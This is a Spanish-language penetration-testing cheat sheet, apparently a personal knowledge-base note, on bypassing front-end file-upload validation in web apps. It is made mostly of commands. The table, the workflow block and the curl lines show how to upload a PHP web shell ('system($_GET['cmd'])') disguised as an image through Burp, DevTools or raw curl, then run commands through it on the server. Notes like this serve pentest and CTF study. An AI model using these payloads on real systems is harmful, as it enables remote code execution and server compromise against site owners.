---
aliases:
tags:
  - vuln/file-upload
  - technique/execution
  - asset/web-app
kind: SubCheatSheet
linked:
  - "[[File Upload - Vulnerabilidades]]"
---
# File Upload - Desactivación de Validación Front-end

---

## Cheatsheet

| **Comando / Acción** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Subir `imagen.png` legítima → interceptar en Burp → editar `filename="shell.php"` y body con PHP | Bypass total del frontend, request directo al backend | Validación solo client-side. |
| DevTools (F12) → Inspect `<input type="file">` → eliminar `onchange="checkFile(this)"` | Función JS de validación no se dispara | Validación JS sin backend check. |
| DevTools → Inspect `<input type="file">` → eliminar `accept=".jpg,.png"` | Diálogo del SO muestra todas las extensiones | Permitir seleccionar `.php` desde el browser. |
| DevTools → Console: `$('form').action='/upload'; $('form').submit()` | Bypass de event handlers anchados al botón | App con submit blocked vía JS event. |
| `curl -F 'file=@shell.php' -H 'Content-Type: multipart/form-data; boundary=---' https://target/upload` | Skipea TODO el frontend — request raw | Total bypass cuando JS framework bloquea drag-drop normal. |
| Burp Repeater → enviar el upload con `filename="shell.php"` + body PHP | Test rápido sin tocar UI | Sin tener que recargar la UI. |
^fu-frontend

### Workflow

```bash
# Opción A — Burp interception
# 1. Setup Burp como proxy + Foxyproxy al browser
# 2. Subir archivo legítimo desde la UI
# 3. Burp captura POST /upload → Action → Send to Repeater
# 4. Modificar:
#    - filename="shell.php"
#    - Content-Type: image/png (mantener para pasar header check)
#    - Body: <?php system($_GET['cmd']); ?>
# 5. Forward

# Opción B — DevTools (cuando no podés MitM HTTPS)
# 1. F12 → Elements → buscar <input type="file">
# 2. Click derecho → "Edit attribute" → quitar accept y onchange
# 3. Seleccionar shell.php desde el botón normal
# 4. Submit funciona porque no hay validación remaining

# Opción C — curl directo
curl -X POST https://target/upload \
  -H 'Cookie: session=...' \
  -F 'file=@shell.php;type=image/png;filename=shell.php'

# Post-upload: ubicar path
curl -s https://target/profile | grep -oE 'src="/uploads/[^"]+'
curl 'https://target/uploads/shell.php?cmd=id'
```

---

## Overview

Validación frontend es **siempre** bypassable — el atacante controla el cliente. Si la app valida SOLO en frontend, basta:

1. **Burp** (preferido) — interceptar y mutar.
2. **DevTools** — desactivar el JS de validación.
3. **curl directo** — skipea la UI completa.

DevTools es útil cuando MitM HTTPS es problemático (cert pinning, CORS strict). Burp es preferido por velocidad y replay.

Si ESTO funciona → la app NO valida en backend = vulnerable. Si frontend bypass falla con error del servidor = hay validación backend → pivotar a [[File Upload - Bypass de Filtros de Lista Negra]]/[[File Upload - Bypass de Filtros de Lista Blanca]].

---
